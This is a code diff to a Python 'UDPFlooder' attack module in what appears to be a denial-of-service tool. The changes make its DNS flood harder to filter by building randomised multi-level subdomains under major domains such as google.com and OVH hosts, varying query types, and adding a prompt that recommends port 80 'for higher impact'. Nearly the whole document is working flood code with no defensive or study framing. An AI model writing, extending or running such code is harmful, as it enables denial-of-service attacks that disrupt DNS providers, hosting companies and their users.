@@ -38,12 +38,39 @@ class UDPFlooder(AttackModule):
         self.packet_size = self.calculate_packet_size(threads, base_size=1024)
         
         self.aggressive_mode = True  # Enable aggressive mode by default
+        # Base domain list for DNS attacks
         self.dns_domains = [
             'google.com', 'facebook.com', 'youtube.com', 'amazon.com', 
             'cloudflare.com', 'microsoft.com', 'apple.com', 'netflix.com',
             'twitter.com', 'instagram.com', 'linkedin.com', 'github.com',
             'ovh.com', 'ovh.net', 'ovhcloud.com'  # Added OVH domains
         ]
+        # Advanced domain structure templates for more effective DNS floods
+        self.domain_structures = [
+            # Simple single subdomain (original style)
+            "{random}.{base_domain}",
+            # Two-level subdomains
+            "{random}.{random2}.{base_domain}",
+            # Three-level deep subdomains
+            "{random}.{random2}.{random3}.{base_domain}",
+            # Long subdomain chains (4+ levels)
+            "{random}.{random2}.{random3}.{random4}.{base_domain}",
+            "{random}.api.{random2}.cdn.{base_domain}",
+            # Service-like patterns that look legitimate
+            "api-{random}.{base_domain}",
+            "cdn-{random}.{random2}.{base_domain}",
+            "api.v{apiversion}.{random}.{base_domain}",
+            "static.{random}.{random2}.{base_domain}",
+            # Regional/location patterns
+            "{random}.{region}.cdn.{base_domain}",
+            "{random}.{country}-{random2}.{base_domain}",
+            # Extra long single subdomain (harder to filter)
+            "{long_random}.{base_domain}"
+        ]
+        # Additional components for domain construction
+        self.region_patterns = ['us-east', 'us-west', 'eu-west', 'ap-south', 'sa-east']
+        self.country_patterns = ['us', 'uk', 'ca', 'au', 'de', 'fr', 'jp', 'br', 'in']
+        self.api_versions = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
         
         # Performance optimization settings
         self.sockets_per_thread = 32  # Increased from 8
@@ -115,16 +142,12 @@ class UDPFlooder(AttackModule):
         # For each port type, generate pattern templates
         self.payload_templates = {}
         
-        # DNS payload templates (port 53) - SIMPLIFIED for better effectiveness
+        # DNS payload templates (port 53) - Enhanced with more complex domain structures
         self.payload_templates[53] = []
-        
-        # Create simpler, more effective DNS query templates
-        for _ in range(10):
-            # Standard query with recursion desired
+        # Create more effective DNS query templates with varied domain structures
+        for _ in range(20):  # Increased from 10 to 20 templates for more variety
             transaction_id = random.randint(0, 65535)
             flags = 0x0100  # Standard query with recursion desired
-            
-            # Create the DNS header - simpler structure
             header = struct.pack('!HHHHHH',
                 transaction_id,  # Transaction ID
                 flags,           # Flags
@@ -133,13 +156,26 @@ class UDPFlooder(AttackModule):
                 0,               # Authority count
                 0                # Additional count
             )
-            
-            # Add to templates with common query types that are less likely to be filtered
+            # Select a random domain structure template
+            domain_structure = random.choice(self.domain_structures)
+            base_domain = random.choice(self.dns_domains)
+            # Prepare domain template with placeholders for random values
+            domain_template = domain_structure.format(
+                random="{random}",
+                random2="{random2}",
+                random3="{random3}",
+                random4="{random4}",
+                long_random="{long_random}",
+                region=random.choice(self.region_patterns),
+                country=random.choice(self.country_patterns),
+                apiversion=random.choice(self.api_versions),
+                base_domain=base_domain
+            )
             self.payload_templates[53].append({
                 'header': header,
-                'domain_template': 'abcdefgh.' + random.choice(self.dns_domains),
+                'domain_template': domain_template,
                 'qdcount': 1,
-                'qtype': 1  # A record (IPv4 address) - most common and least likely to be filtered
+                'qtype': random.choice([1, 28, 16, 2])  # Random selection of query types
             })
         
         # Generate generic payload patterns for other ports with more variety
@@ -187,16 +223,26 @@ class UDPFlooder(AttackModule):
             if size > self.packet_size:
                 size = self.packet_size
         
-        # For DNS port, generate simplified DNS query
+        # For DNS port, generate enhanced DNS query
         if port == 53:
             template = random.choice(self.payload_templates[53])
             header = template['header']
             
-            # Generate a unique subdomain
-            prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
-            domain = template['domain_template'].replace('abcdefgh', prefix)
+            # Generate random components for multi-level subdomains
+            random_component = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
+            random_component2 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
+            random_component3 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=5))
+            random_component4 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=4))
+            long_random_component = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24))
             
-            # Build question section (simpler)
+            # Apply replacements to the domain template
+            domain = template['domain_template'].replace('{random}', random_component)
+            domain = domain.replace('{random2}', random_component2)
+            domain = domain.replace('{random3}', random_component3)
+            domain = domain.replace('{random4}', random_component4)
+            domain = domain.replace('{long_random}', long_random_component)
+            
+            # Build question section for multi-level domain
             question = b''
             parts = domain.split('.')
             for part in parts:
@@ -204,8 +250,8 @@ class UDPFlooder(AttackModule):
                 question += struct.pack('B', len(encoded_part)) + encoded_part
             question += b'\x00'  # Null terminator
             
-            # Use A record query (type 1) - most common and least likely to be filtered
-            question += struct.pack('!HH', template['qtype'], 1)  # Type A, Class IN
+            # Use the query type from template
+            question += struct.pack('!HH', template['qtype'], 1)  # Type from template, Class IN
             
             # Combine header and question
             dns_query = header + question
@@ -425,6 +471,7 @@ class UDPFlooder(AttackModule):
         
         # Special handling for DNS ports
         if 53 in self.ports:
+            UI.print_error("WARNING: Port 53 (DNS) is often heavily filtered by most providers and networks. DNS floods on port 53 have a low chance of breaking through. For higher impact, consider using port 80 or other less-filtered ports.")
             UI.print_info("DNS port (53) detected - Using simplified DNS attack techniques")
             UI.print_info("Note: DNS traffic is often filtered. For maximum impact, consider using port 80 instead.")
         
